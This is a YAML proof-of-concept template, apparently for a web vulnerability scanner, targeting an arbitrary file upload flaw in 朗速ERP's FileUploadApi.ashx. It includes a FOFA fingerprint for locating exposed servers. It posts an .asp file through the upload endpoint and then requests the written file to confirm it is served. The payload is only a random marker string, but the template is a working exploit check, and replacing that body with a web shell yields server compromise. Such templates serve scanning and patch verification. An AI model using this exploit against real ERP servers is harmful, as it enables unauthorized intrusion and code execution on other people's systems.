id: poc-yaml-lserp-fileuploadapi-ashx-anyfile-upload
info:
  name: 朗速ERP FileUploadApi.ashx 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 朗速ERP
  fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /Api/FileUploadApi.ashx?method=DoWebUpload
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.asp"

    Content-Type: image/jpeg


    {{.t2}}

    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
  expression: status_code == 200 && contains(body,"\"Success\":true") && contains(body,"WebRelPath")
    && !contains(body,"<")
  output:
  - regex_match(body,"\"WebRelPath\":\"/(?P<file>.*?).asp")
- method: GET
  path: /{{.file}}.asp
  expression: status_code == 200 && body == t2
transport: http
